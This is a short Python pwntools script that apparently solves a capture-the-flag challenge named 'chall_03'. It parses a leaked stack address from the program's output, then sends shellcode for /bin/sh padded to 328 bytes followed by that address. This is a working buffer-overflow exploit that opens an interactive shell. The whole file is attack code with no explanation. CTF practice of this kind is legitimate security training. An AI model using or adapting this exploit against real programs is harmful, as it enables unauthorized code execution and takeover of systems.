# coding: utf-8
from pwn import *
p = process("./chall_03")  
resp = p.recv()
import re
leak = re.findall(b"(0x[0-9a-f]{8,16})", resp)[0]
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + (328 - len(shellcode))*b"A" + p64(int(leak, 16))
p.sendline(payload)
p.interactive()
